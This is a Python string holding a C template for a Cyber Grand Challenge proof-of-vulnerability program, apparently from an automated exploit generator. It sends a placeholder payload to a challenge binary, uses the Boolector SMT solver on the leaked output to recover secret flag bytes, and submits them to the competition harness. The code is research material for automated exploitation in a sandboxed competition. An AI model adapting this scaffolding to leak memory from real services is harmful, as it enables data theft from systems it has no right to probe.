c_template = """
#include <libcgc.h>
#include <stdlib.h>
#include <boolector.h>
#include <string.h>

/* global output data */
char *output;
size_t output_size;

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

void die(const char *str) {
    transmit(2, str, strlen(str), NULL);
    _terminate(1);
}

void debug_str(const char *str) {
    transmit(2, str, strlen(str), NULL);
}

/*
 * Test file descriptor readiness.
 */

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

/*
 * Receive n_bytes into no particular buffer.
 */
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

char to_char(char *str) {
  int i;
  char r = '\\0';

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

void to_bits(char *dst, char c) {
    int i;
    for(i=0;i<8;i++) {
        dst[i] = '0' + ((c & (1 << (7-i))) >> (7-i));
    }
}

void get_output(size_t n_bytes) {
    unsigned char *buf = malloc(n_bytes);
    if (!buf)
      die("receive buffer malloc failed");

    if (receive_n(1, buf, n_bytes) != n_bytes)
        goto error;

    // convert it to a bitstring
    //  
    if (output)
        output = realloc(output, output_size + (n_bytes * 8) + 1); 
    else
        output = malloc(n_bytes * 8 + 1); 

    char *bitbuf = output;
    if (!bitbuf)
      die("bitbuf malloc failed");

    size_t i;
    for(i=0;i<n_bytes;i++) {
        to_bits(bitbuf + output_size + (i * 8), buf[i]);
    }   

    bitbuf[output_size + n_bytes * 8] = '\\0';

    /* update output size */
    output_size = output_size + n_bytes * 8;

error:
    free(buf);
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}


int do_pov() {
  type2_vals t2vals;
  if (type2_negotiate(&t2vals) != 0) {
    _terminate(0);
  }

  Btor *btor = boolector_new();

  boolector_set_opt(btor, "model_gen", 1);

  const char *smt_stmt = {smt_stmt};

  char *error;
  int status;
  boolector_parse(btor, smt_stmt, &error, &status);
  if (error)
    die(error);

  char payload[] = "{payload}";

  send_all(1, payload, {payloadsize});

  {receive_code}

  BoolectorNode *output_var = boolector_match_node_by_id(btor, {output_var_idx});
  BoolectorNode *cgc_flag_var = boolector_match_node_by_id(btor, {cgc_flag_data_idx});

  BoolectorNode *output_val = boolector_const(btor, output);

  BoolectorNode *out_cons = boolector_eq(btor, output_var, output_val);

  boolector_assert(btor, out_cons);

  if (boolector_sat(btor) != BOOLECTOR_SAT)
    die("unsat");

  char *flag_data = boolector_bv_assignment(btor, cgc_flag_var);

  char flag[4];

  flag[0] = to_char(flag_data + {flag_byte_1} * 8);
  flag[1] = to_char(flag_data + {flag_byte_2} * 8);
  flag[2] = to_char(flag_data + {flag_byte_3} * 8);
  flag[3] = to_char(flag_data + {flag_byte_4} * 8);

  type2_submit((unsigned char *)flag, t2vals.read_size);

  return 0;
}

int main(void) {
    /* align the stack so that boolector can work in all circumstances */
    asm(\"and $0xfffffff0, %esp\\n\");

    /* terminate, stack hasn't been fixed up */
    _terminate(do_pov());
}

"""
